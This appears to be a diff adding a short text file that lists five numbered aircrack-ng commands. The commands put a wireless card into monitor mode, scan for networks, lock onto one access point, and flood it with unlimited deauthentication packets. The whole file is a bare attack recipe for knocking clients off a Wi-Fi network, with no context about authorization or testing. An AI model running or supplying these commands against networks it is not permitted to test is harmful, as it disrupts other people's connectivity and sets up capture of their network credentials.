@@ -1,0 +1,6 @@
+1) airmon-ng check kill
+2) airmon-ng start wlan0
+3) airodump-ng wlan0mon
+4) airodump-ng --bssid MAC-adress -c (¹of channel) wlan0mon
+5)aireplay-ng --deauth 0 -a MAC-adress wlan0mon 
+
